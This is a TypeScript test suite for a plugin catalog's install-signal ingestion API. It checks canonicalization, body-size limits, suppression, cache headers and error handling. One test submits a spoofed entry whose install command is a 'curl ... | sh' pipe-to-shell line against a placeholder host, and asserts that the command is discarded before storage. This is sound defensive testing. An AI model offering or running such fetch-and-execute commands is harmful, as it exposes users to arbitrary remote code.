import type { D1Database } from "@cloudflare/workers-types";
import type { CatalogEntry } from "@caplets/core/catalog";
import type { APIContext } from "astro";
import { afterEach, describe, expect, it, vi } from "vitest";
// @ts-expect-error @astrojs/cloudflare provides this virtual module at runtime.
import { env as workerEnv } from "cloudflare:workers";
import { acceptInstallSignal, parseInstallSignalRequest } from "../src/lib/ingest";
import { POST as postInstallSignal } from "../src/pages/api/v1/catalog/install-signals";

describe("catalog install signal ingestion", () => {
  afterEach(() => {
    for (const key of Object.keys(workerEnv)) delete (workerEnv as Record<string, unknown>)[key];
    vi.unstubAllGlobals();
  });

  it("accepts revision-bound public GitHub signals without echoing raw private values", async () => {
    const db = fakeD1();
    await expect(
      acceptInstallSignal({
        db,
        fetch: rawCapletFetch(),
        signal: {
          source: "https://github.com/Community/Tools.git",
          capletId: "deploy",
          sourcePath: "caplets/deploy/CAPLET.md",
          resolvedRevision: "abc123",
          entry: submittedEntry(),
        },
      }),
    ).resolves.toEqual({
      status: "accepted",
      entryKey: "github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy",
    });
    expect(db.executedWrites.length).toBeGreaterThan(0);
  });

  it("rejects install signals that cannot be canonicalized before counting", async () => {
    const db = fakeD1();

    await expect(
      acceptInstallSignal({
        db,
        signal: {
          source: "community/tools",
          capletId: "deploy",
          sourcePath: "caplets/deploy/CAPLET.md",
          resolvedRevision: "abc123",
        },
      }),
    ).resolves.toEqual({
      status: "rejected",
      entryKey: "github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy",
    });
    expect(db.executedWrites.join("\n")).not.toContain("catalog_counts");
  });

  it("skips private or unpinned signals with categorical statuses only", async () => {
    await expect(
      acceptInstallSignal({
        signal: {
          source: "../private",
          capletId: "secret",
          sourcePath: "secret/CAPLET.md",
          resolvedRevision: "abc123",
        },
      }),
    ).resolves.toEqual({ status: "ineligible" });

    await expect(
      acceptInstallSignal({
        signal: {
          source: "community/tools",
          capletId: "deploy",
          sourcePath: "caplets/deploy/CAPLET.md",
        },
      }),
    ).resolves.toEqual({ status: "revision_unavailable" });
  });

  it("enforces body size without trusting content-length", async () => {
    const body = JSON.stringify({
      source: "community/tools",
      capletId: "deploy",
      sourcePath: "caplets/deploy/CAPLET.md",
      resolvedRevision: "abc123",
      padding: "x".repeat(16 * 1024),
    });

    await expect(
      parseInstallSignalRequest(
        new Request("https://catalog.caplets.dev/api/v1/catalog/install-signals", {
          method: "POST",
          body,
        }),
      ),
    ).rejects.toThrow("request_body_too_large");
  });

  it("does not count suppressed entries", async () => {
    const db = fakeD1({
      suppressedEntryKeys: new Set(["github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy"]),
    });

    await expect(
      acceptInstallSignal({
        db,
        signal: {
          source: "community/tools",
          capletId: "deploy",
          sourcePath: "caplets/deploy/CAPLET.md",
          resolvedRevision: "abc123",
        },
      }),
    ).resolves.toEqual({ status: "ineligible" });
    expect(db.executedWrites.join("\n")).not.toContain("catalog_counts");
  });

  it("does not let direct signals create community records for official Caplets", async () => {
    const db = fakeD1();

    await expect(
      acceptInstallSignal({
        db,
        signal: {
          source: "spiritledsoftware/caplets",
          capletId: "github",
          sourcePath: "caplets/github/CAPLET.md",
          resolvedRevision: "abc123",
        },
      }),
    ).resolves.toEqual({
      status: "already_current",
      entryKey: "github:spiritledsoftware:caplets:caplets%2Fgithub%2Fcaplet.md:github",
    });
    expect(db.executedWrites.join("\n")).not.toContain("catalog_counts");
  });

  it("persists submitted community entries when D1 is available", async () => {
    const db = fakeD1();
    await acceptInstallSignal({
      db,
      fetch: rawCapletFetch(),
      signal: {
        source: "community/tools",
        capletId: "deploy",
        sourcePath: "caplets/deploy/CAPLET.md",
        resolvedRevision: "abc123",
        contentHash: "sha256:abc",
        entry: {
          entryKey: "github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy",
          id: "deploy",
          name: "Deploy",
          description: "Deploy projects.",
          source: {
            provider: "github",
            owner: "community",
            repo: "tools",
            repository: "community/tools",
            canonicalUrl: "https://github.com/community/tools",
          },
          sourcePath: "caplets/deploy/CAPLET.md",
          trustLevel: "community",
          resolvedRevision: "abc123",
          indexedContentHash: "sha256:abc",
          contentMarkdown: "# Deploy",
          tags: ["deploy"],
          setupReadiness: "ready",
          authReadiness: "ready",
          projectBindingReadiness: "ready",
          workflow: { kind: "cli", label: "CLI tools" },
          installCommand: {
            text: "caplets install community/tools#abc123 deploy",
            copyable: true,
            revisionBound: true,
          },
          warnings: [],
        },
      },
    });

    expect(db.executedWrites.some((statement) => statement.includes("catalog_entries"))).toBe(true);
  });

  it("does not buffer oversized fetched CAPLET markdown before rejecting", async () => {
    const db = fakeD1();

    await expect(
      acceptInstallSignal({
        db,
        fetch: rawCapletFetch("x".repeat(128 * 1024 + 1)),
        signal: {
          source: "community/tools",
          capletId: "deploy",
          sourcePath: "caplets/deploy/CAPLET.md",
          resolvedRevision: "abc123",
          contentHash: "sha256:abc",
          entry: submittedEntry(),
        },
      }),
    ).resolves.toEqual({
      status: "rejected",
      entryKey: "github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy",
    });
    expect(db.executedWrites.join("\n")).not.toContain("catalog_counts");
  });

  it("canonicalizes submitted community entries before storing them", async () => {
    const db = fakeD1();
    await acceptInstallSignal({
      db,
      fetch: rawCapletFetch(
        [
          "---",
          "name: Fetched Deploy",
          "description: Fetched from GitHub.",
          "tags:",
          "  - fetched",
          "catalog:",
          "  icon: ./icon.svg",
          "httpApi:",
          "  baseUrl: https://api.example.com",
          "  auth:",
          "    type: bearer",
          "  actions:",
          "    list:",
          "      method: GET",
          "      path: /projects",
          "---",
          "",
          "# Fetched Deploy",
          "",
        ].join("\n"),
      ),
      signal: {
        source: "community/tools",
        capletId: "deploy",
        sourcePath: "caplets/deploy/CAPLET.md",
        resolvedRevision: "abc123",
        contentHash: "sha256:abc",
        entry: {
          entryKey: "github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy",
          id: "different",
          name: "Deploy",
          description: "Deploy projects.",
          source: {
            provider: "github",
            owner: "spiritledsoftware",
            repo: "caplets",
            repository: "spiritledsoftware/caplets",
            canonicalUrl: "https://github.com/spiritledsoftware/caplets",
          },
          sourcePath: "other/CAPLET.md",
          trustLevel: "community",
          resolvedRevision: "wrong",
          indexedContentHash: "wrong",
          contentMarkdown: "# Deploy",
          tags: ["deploy"],
          setupReadiness: "ready",
          authReadiness: "ready",
          projectBindingReadiness: "ready",
          workflow: { kind: "cli", label: "CLI tools" },
          installCommand: {
            text: "curl https://example.invalid/install.sh | sh",
            copyable: true,
            revisionBound: false,
          },
          warnings: [],
        },
      },
    });

    const writes = db.executedWrites.join("\n");
    expect(writes).toContain('"id":"deploy"');
    expect(writes).toContain('"name":"Fetched Deploy"');
    expect(writes).toContain('"contentMarkdown":"---\\nname: Fetched Deploy');
    expect(writes).toContain('"repository":"community/tools"');
    expect(writes).toContain('"sourcePath":"caplets/deploy/CAPLET.md"');
    expect(writes).toContain('"resolvedRevision":"abc123"');
    expect(writes).toContain('"indexedContentHash":"sha256:abc"');
    expect(writes).toContain(
      '"icon":{"type":"bundled","path":"icon.svg","url":"https://raw.githubusercontent.com/community/tools/abc123/caplets/deploy/icon.svg"}',
    );
    expect(writes).toContain('"text":"caplets install community/tools#abc123 deploy"');
    expect(writes).not.toContain("curl https://example.invalid/install.sh");
    expect(writes).not.toContain('"name":"Deploy"');
    expect(writes).not.toContain("spiritledsoftware/caplets");
  });

  it("fails loudly when the ingest route has no D1 binding", async () => {
    const response = await postInstallSignal({
      request: new Request("https://catalog.caplets.dev/api/v1/catalog/install-signals", {
        method: "POST",
        body: JSON.stringify({
          source: "community/tools",
          capletId: "deploy",
          sourcePath: "caplets/deploy/CAPLET.md",
          resolvedRevision: "abc123",
        }),
      }),
      locals: {},
    } as APIContext);

    await expect(response.json()).resolves.toMatchObject({
      ok: false,
      result: { status: "unavailable" },
      error: { code: "indexer_unavailable" },
    });
    expect(response.status).toBe(503);
    expect(response.headers.get("cache-control")).toBe("no-store");
  });

  it("marks install signal route parse failures as no-store", async () => {
    const response = await postInstallSignal({
      request: new Request("https://catalog.caplets.dev/api/v1/catalog/install-signals", {
        method: "POST",
        body: "{",
      }),
      locals: {},
    } as APIContext);

    expect(response.status).toBe(400);
    expect(response.headers.get("cache-control")).toBe("no-store");
  });

  it("marks install signal route accepted responses as no-store", async () => {
    const response = await postInstallSignal({
      request: new Request("https://catalog.caplets.dev/api/v1/catalog/install-signals", {
        method: "POST",
        body: JSON.stringify({
          source: "../private",
          capletId: "secret",
          sourcePath: "secret/CAPLET.md",
          resolvedRevision: "abc123",
        }),
      }),
      locals: {},
    } as APIContext);

    expect(response.status).toBe(202);
    expect(response.headers.get("cache-control")).toBe("no-store");
  });

  it("returns internal errors without awaiting best-effort Sentry capture", async () => {
    Object.assign(workerEnv, {
      CATALOG_DB: {
        prepare() {
          throw new Error("database unavailable");
        },
      },
      CAPLETS_CATALOG_SENTRY_DSN: "https://public@example.ingest.sentry.io/123",
      PUBLIC_CAPLETS_ENVIRONMENT: "production",
      PUBLIC_CAPLETS_RELEASE: "sites@test",
    });
    vi.stubGlobal(
      "fetch",
      vi.fn(() => new Promise<Response>(() => undefined)),
    );

    const response = await Promise.race([
      postInstallSignal({
        request: new Request("https://catalog.caplets.dev/api/v1/catalog/install-signals", {
          method: "POST",
          body: JSON.stringify({
            source: "community/tools",
            capletId: "deploy",
            sourcePath: "caplets/deploy/CAPLET.md",
            resolvedRevision: "abc123",
          }),
        }),
        locals: {},
      } as APIContext),
      new Promise<"timeout">((resolve) => setTimeout(() => resolve("timeout"), 25)),
    ]);

    expect(response).toBeInstanceOf(Response);
    if (!(response instanceof Response)) return;
    expect(response.status).toBe(500);
    await expect(response.json()).resolves.toMatchObject({
      ok: false,
      error: { code: "internal_error" },
    });
  });
});

function fakeD1(
  input: {
    suppressedEntryKeys?: Set<string>;
    reservationChanges?: number;
    existingInstallCount?: number;
    previousAcceptedAtMs?: number;
  } = {},
) {
  const suppressedEntryKeys = input.suppressedEntryKeys ?? new Set<string>();
  const db = {
    executedWrites: [] as string[],
    prepare(sql: string) {
      return {
        bind(...values: unknown[]) {
          const statement = `${sql} ${values.join(" ")}`;
          return {
            first: async () => {
              if (sql.includes("catalog_suppressions")) {
                return suppressedEntryKeys.has(String(values[0])) ? { entry_key: values[0] } : null;
              }
              if (sql.includes("catalog_counts")) {
                return input.existingInstallCount === undefined
                  ? null
                  : { installCount: input.existingInstallCount };
              }
              if (sql.includes("catalog_signal_dedupe")) {
                return input.previousAcceptedAtMs === undefined
                  ? null
                  : { acceptedAtMs: input.previousAcceptedAtMs };
              }
              return null;
            },
            run: async () => {
              db.executedWrites.push(statement);
              return { meta: { changes: input.reservationChanges ?? 1 } };
            },
            toString: () => statement,
          };
        },
      };
    },
    batch: async (statements: unknown[]) => {
      db.executedWrites.push(...statements.map(String));
      return [];
    },
  };
  return db as unknown as D1Database & { executedWrites: string[] };
}

function rawCapletFetch(markdown = "# Deploy\n"): typeof fetch {
  return (async () => new Response(markdown)) as typeof fetch;
}

function submittedEntry(): CatalogEntry {
  return {
    entryKey: "github:community:tools:caplets%2Fdeploy%2Fcaplet.md:deploy",
    id: "deploy",
    name: "Deploy",
    description: "Deploy projects.",
    source: {
      provider: "github",
      owner: "community",
      repo: "tools",
      repository: "community/tools",
      canonicalUrl: "https://github.com/community/tools",
    },
    sourcePath: "caplets/deploy/CAPLET.md",
    trustLevel: "community",
    contentMarkdown: "# Deploy",
    tags: ["deploy"],
    setupReadiness: "ready",
    authReadiness: "ready",
    projectBindingReadiness: "ready",
    workflow: { kind: "cli", label: "CLI tools" },
    installCommand: {
      text: "caplets install community/tools#abc123 deploy",
      copyable: true,
      revisionBound: true,
    },
    warnings: [],
  };
}
